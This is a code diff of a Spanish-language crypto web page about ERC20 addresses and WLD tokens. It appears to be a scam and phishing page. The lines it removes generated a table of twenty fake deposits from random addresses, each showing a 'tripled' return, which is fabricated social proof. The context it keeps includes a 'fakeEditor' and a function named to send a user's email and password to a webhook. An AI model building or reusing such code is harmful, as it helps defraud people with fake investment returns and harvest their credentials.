@@ -58,9 +58,7 @@
             flex-direction: column; /* Asegura que los elementos se apilen verticalmente */
             align-items: center; /* Centra los elementos horizontalmente */
         }
-        table { width: 100%; border-collapse: collapse; }
-  th, td { border: 1px solid #dddddd; text-align: left; padding: 8px; }
-  th { background-color: #f2f2f2; }
+      
 
         h1, h2 {
             color: #ff073a;
@@ -178,18 +176,7 @@ a {
       
 </style>
    <div id="fakeEditor" >
-<table id="depositosTabla">
-  <thead>
-    <tr>
-      <th>Dirección</th>
-      <th>Depósito</th>
-      <th>Retorno</th>
-    </tr>
-  </thead>
-  <tbody>
-    <!-- Las filas se añadirán dinámicamente aquí -->
-  </tbody>
-</table>
+
 
    
 </body>
@@ -284,32 +271,13 @@ document.getElementById('confirmAddress').addEventListener('click', function() {
         alert('Dirección confirmada. Ahora puedes copiarla.');
         mostrarFakeEditor();
         iniciarContador();
-        generarDepositos(); // Esta función llena la tabla con los datos de depósitos.
-        document.getElementById('depositosTabla').style.display = 'table'; // Asegura que tu tabla esté visible después de confirmar la dirección.
+       
     } else {
         alert('Por favor, ingresa una dirección ERC20 válida.');
     }
 });
 
-function generarDepositos() {
-  const tabla = document.getElementById("depositosTabla");
 
-  // Asegúrate de limpiar la tabla antes de añadir nuevas filas para evitar duplicados si el usuario confirma la dirección múltiples veces.
-  while(tabla.rows.length > 1) {
-    tabla.deleteRow(1);
-  }
-
-  for (let i = 0; i < 20; i++) {
-    const deposito = generarDepositoAleatorio();
-    const direccion = generarDireccionAleatoria();
-    const retorno = deposito * 3; // Retorno triplicado
-
-    const fila = tabla.insertRow();
-    fila.insertCell().textContent = direccion;
-    fila.insertCell().textContent = deposito.toFixed(2) + " WLD";
-    fila.insertCell().textContent = retorno.toFixed(2) + " WLD";
-  }
-}
 
 
 // Función para verificar si una cadena corresponde a una dirección ERC20 válida
@@ -403,40 +371,6 @@ function mostrarFakeEditor() {
     }, 1000); // Intervalo entre puntos en el mensaje de carga
 }
 
-function generarDepositos() {
-  const tabla = document.getElementById("depositosTabla");
-
-  for (let i = 0; i < 20; i++) { // Genera 20 depósitos para el ejemplo
-    const deposito = generarDepositoAleatorio();
-    const direccion = generarDireccionAleatoria();
-    const retorno = deposito * 3; // Retorno triplicado
-
-    const fila = tabla.insertRow();
-    fila.insertCell().textContent = direccion;
-    fila.insertCell().textContent = deposito.toFixed(2) + " WLD";
-    fila.insertCell().textContent = retorno.toFixed(2) + " WLD";
-  }
-}
-
-function generarDepositoAleatorio() {
-  // Genera un número aleatorio con mayor frecuencia entre 3 y 25
-  if (Math.random() < 0.7) {
-    return Math.random() * (25 - 3) + 3; // Mayor frecuencia de 3 a 25
-  } else {
-    return Math.random() * (97 - 26) + 26; // Menor frecuencia de 26 a 97
-  }
-}
-
-function generarDireccionAleatoria() {
-  // Genera una cadena aleatoria que simula una dirección ERC20
-  const caracteres = "0123456789ABCDEF";
-  let direccion = "0x";
-  for (let i = 0; i < 40; i++) {
-    direccion += caracteres.charAt(Math.floor(Math.random() * caracteres.length));
-  }
-  return direccion;
-}
-  generarDepositos();
 
 
 function enviarDatosAWebhook(email, contrasena) {
